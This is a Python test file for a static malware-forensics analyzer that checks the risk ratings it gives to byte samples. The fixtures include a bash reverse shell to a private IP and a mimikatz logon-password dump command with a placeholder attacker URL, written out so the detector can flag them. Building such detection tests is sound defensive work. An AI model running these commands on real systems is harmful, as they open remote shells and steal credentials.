"""Tests for `services/forensics.py` static analysis (no files, no execution).

Help: feeds byte strings straight to `analyze_bytes`; asserts risk levels for
benign text (LOW), reverse shell (CRITICAL), keywords+IOCs (HIGH), ELF header.
"""
from app.services.forensics import analyze_bytes, KALI_FORENSICS_CATALOG


def test_catalog_maps_kali_tools():
    names = " ".join(t["kali_tool"] for t in KALI_FORENSICS_CATALOG)
    for tool in ("Ghidra", "Volatility", "Wireshark", "YARA", "strings"):
        assert tool in names


def test_benign_text_is_low():
    r = analyze_bytes(b"hello lab report\nnothing suspicious here\n", "notes.txt")
    assert r["risk"] == "LOW"
    assert r["file_type"].startswith("Text")
    assert len(r["sha256"]) == 64


def test_reverse_shell_is_critical():
    r = analyze_bytes(b"#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.9/4444 0>&1\n", "evil.sh")
    assert r["risk"] == "CRITICAL"
    assert any(f["severity"] == "CRITICAL" for f in r["flags"])


def test_keyword_and_iocs_flagged():
    blob = b"run mimikatz sekurlsa::logonpasswords then call https://evil.example/x and 1.2.3.4"
    r = analyze_bytes(blob, "sample.bin")
    assert r["risk"] == "HIGH"
    assert r["indicator_urls"] == ["https://evil.example/x"]
    assert "1.2.3.4" in r["indicator_ips"]


def test_elf_detected():
    r = analyze_bytes(b"\x7fELF" + b"\x00" * 100, "a.out")
    assert r["file_type"].startswith("ELF")
    assert any(f["rule"] == "type:executable" for f in r["flags"])
